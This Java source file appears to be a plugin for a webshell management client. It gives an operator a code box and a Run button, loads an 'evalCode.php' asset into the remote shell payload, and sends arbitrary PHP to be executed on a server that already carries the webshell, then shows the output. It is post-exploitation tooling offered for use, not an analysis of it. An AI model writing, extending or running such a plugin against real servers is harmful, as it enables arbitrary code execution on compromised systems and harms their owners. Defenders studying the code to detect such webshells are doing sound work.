package shells.plugins.php;

import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import java.awt.BorderLayout;
import java.awt.FlowLayout;
import java.awt.event.ActionEvent;
import java.io.InputStream;
import javax.swing.JButton;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.border.TitledBorder;
import util.Log;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

@PluginAnnotation(Name = "P_Eval_Code", payloadName = "PhpDynamicPayload")
public class PhpEvalCode implements Plugin {
    private static final String CLASS_NAME = "PHP_Eval_Code";
    private RTextArea codeTextArea = new RTextArea();
    private Encoding encoding;
    private boolean loadState;
    private JPanel panel = new JPanel(new BorderLayout());
    private Payload payload;
    private RTextArea resultTextArea = new RTextArea();
    private JButton runButton = new JButton("Run");
    private ShellEntity shellEntity;

    public PhpEvalCode() {
        JSplitPane pane1 = new JSplitPane();
        JSplitPane pane2 = new JSplitPane();
        JPanel runButtonPanel = new JPanel(new FlowLayout());
        runButtonPanel.add(this.runButton);
        this.codeTextArea.setBorder(new TitledBorder("code"));
        this.resultTextArea.setBorder(new TitledBorder("result"));
        this.codeTextArea.setText("\necho \"hello word!\";\t\t\t\t\t");
        pane1.setOrientation(1);
        pane1.setLeftComponent(new JScrollPane(this.codeTextArea));
        pane1.setRightComponent(runButtonPanel);
        pane2.setOrientation(1);
        pane2.setLeftComponent(pane1);
        pane2.setRightComponent(new JScrollPane(this.resultTextArea));
        this.panel.add(pane2);
    }

    private void Load() {
        if (!this.loadState) {
            try {
                InputStream inputStream = getClass().getClassLoader().getResourceAsStream("shell/php/assets/evalCode.php");
                byte[] data = functions.readInputStream(inputStream);
                inputStream.close();
                if (this.payload.include(CLASS_NAME, data)) {
                    this.loadState = true;
                    Log.log("Load success", new Object[0]);
                    return;
                }
                Log.error("Load fail");
            } catch (Exception e) {
                Log.error(e);
            }
        } else {
            JOptionPane.showMessageDialog(this.shellEntity.getFrame(), "Loaded", "提示", 1);
        }
    }

    private void runButtonClick(ActionEvent actionEvent) {
        String code = this.codeTextArea.getText();
        if (code == null || code.trim().length() <= 0) {
            JOptionPane.showMessageDialog(this.shellEntity.getFrame(), "code is null", "提示", 2);
            return;
        }
        this.resultTextArea.setText(eval(code));
    }

    public String eval(String code) {
        return eval(code, new ReqParameter());
    }

    public String eval(String code, ReqParameter reqParameter) {
        reqParameter.add("plugin_eval_code", code);
        if (!this.loadState) {
            Load();
        }
        return this.encoding.Decoding(this.payload.evalFunc(CLASS_NAME, "xxx", reqParameter));
    }

    @Override 
    public void init(ShellEntity shellEntity2) {
        this.shellEntity = shellEntity2;
        this.payload = this.shellEntity.getPayloadModel();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(this, this);
    }

    @Override 
    public JPanel getView() {
        return this.panel;
    }
}
